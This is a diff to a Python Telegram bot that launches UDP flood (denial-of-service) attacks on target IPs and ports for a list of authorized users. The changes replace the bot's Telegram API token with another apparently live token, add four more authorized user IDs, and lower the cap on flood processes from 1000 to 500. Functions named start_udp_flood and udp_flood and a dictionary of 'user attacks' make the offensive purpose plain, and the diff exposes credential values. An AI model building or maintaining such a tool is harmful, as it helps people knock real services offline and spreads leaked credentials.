@@ -38,11 +38,11 @@ def install_requirements():
 install_requirements()
 
 # 🎛️ Telegram API token (replace with your actual token)
-TOKEN = '7482560868:AAGfxxG1-Qe3yUpcl82o3lVEOByl67YWlnA'
+TOKEN = '7726759934:AAEAD1STQ2EKf5YDnNIjUG3NT6JwqqopouI'
 bot = telebot.TeleBot(TOKEN, threaded=False)
 
 # 🛡️ List of authorized user IDs (replace with actual IDs)
-AUTHORIZED_USERS = [809680839, 6740684755 , 6090084901]
+AUTHORIZED_USERS = [809680839, 6740684755 , 6090084901 , 7299617317 , 6475243593 , 6501111374 , 6485980375]
 
 # 🌐 Global dictionary to keep track of user attacks
 user_attacks = {}
@@ -72,8 +72,8 @@ def start_udp_flood(user_id, target_ip, target_port):
     stop_flag = multiprocessing.Event()
     processes = []
 
-    # Allow up to 1000 CPU threads for maximum performance
-    for _ in range(min(1000, multiprocessing.cpu_count())):
+    # Allow up to 500 CPU threads for maximum performance
+    for _ in range(min(500, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
